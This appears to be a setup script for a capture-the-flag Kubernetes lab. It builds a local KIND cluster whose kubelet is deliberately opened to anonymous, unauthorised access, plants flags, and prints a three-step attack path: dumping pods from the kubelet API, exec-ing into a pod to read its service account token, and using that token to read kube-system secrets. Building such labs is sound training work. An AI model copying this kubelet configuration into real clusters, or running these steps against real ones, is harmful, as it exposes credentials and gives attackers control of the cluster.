#!/bin/bash
set -euo pipefail
CLUSTER_NAME="cve-chain6-kubelet-pods"
FLAG1="${CVE_FLAG1:-flag{chain6-step1-kubelet}}"
FLAG2="${CVE_FLAG2:-flag{chain6-step2-rbac}}"
FLAG3="${CVE_FLAG3:-flag{chain6-step3-pod-final}}"

echo "[Chain 6] Kubelet Anonymous to Cluster Pod Access — 3 steps, K8s"
echo "[*] Creating KIND cluster with anonymous kubelet..."

kind create cluster --name "$CLUSTER_NAME" --config - << 'KINDCFG'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3
    kubeadmConfigPatches:
      - |
        kind: InitConfiguration
        nodeRegistration:
          kubeletExtraArgs:
            anonymous-auth: "true"
            authorization-mode: "AlwaysAllow"
KINDCFG

kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10
kind load docker-image nginx:1.24-alpine alpine:latest --name "$CLUSTER_NAME" 2>/dev/null || true

# Step 1 flag: literal env on a pod, visible through the anonymous kubelet /pods API
kubectl apply -f - << YAML
apiVersion: v1
kind: Pod
metadata:
  name: chain6-holder
  namespace: default
spec:
  containers:
    - name: nginx
      image: nginx:1.24-alpine
      imagePullPolicy: IfNotPresent
      env:
        - name: FLAG
          value: "$FLAG1"
YAML

# Step 2: namespace-scoped secrets reader SA (only kube-system secrets)
kubectl create sa chain6-sa -n default 2>/dev/null || true
kubectl apply -f - << YAML
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: chain6-secret-reader
  namespace: kube-system
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: chain6-secret-reader
  namespace: kube-system
subjects:
  - kind: ServiceAccount
    name: chain6-sa
    namespace: default
roleRef:
  kind: Role
  name: chain6-secret-reader
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Pod
metadata:
  name: secret-holder
  namespace: default
spec:
  serviceAccountName: chain6-sa
  containers:
    - name: app
      image: nginx:1.24-alpine
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
YAML

# Step 2 flag (readable only with the chain6-sa token)
kubectl create secret generic chain6-step2 --from-literal=flag="$FLAG2" -n kube-system 2>/dev/null || true

# Step 3 final flag pod (kubelet exec target)
kubectl apply -f - << YAML
apiVersion: v1
kind: Pod
metadata:
  name: chain6-final
  namespace: default
spec:
  containers:
    - name: app
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sh", "-c"]
      args:
        - "echo '$FLAG3' > /flag.txt; sleep 3600"
YAML

kubectl wait --for=condition=Ready pod/chain6-holder --timeout=60s 2>/dev/null || true
kubectl wait --for=condition=Ready pod/secret-holder --timeout=60s 2>/dev/null || true
kubectl wait --for=condition=Ready pod/chain6-final --timeout=60s 2>/dev/null || true
sleep 5

NODE_IP=$(kubectl get node -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
echo ""
echo "[Chain 6] Ready"
echo "    Node IP: ${NODE_IP}"
echo "    Step 1: curl -sk https://${NODE_IP}:10250/pods | grep -A2 chain6-holder  (flag in env)"
echo "    Step 2: use a websocket client (e.g. kubeletctl exec default secret-holder -c app -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
echo "           then: kubectl --token=\$TOKEN get secret chain6-step2 -n kube-system"
echo "    Step 3: kubeletctl exec default chain6-final -c app -- cat /flag.txt"
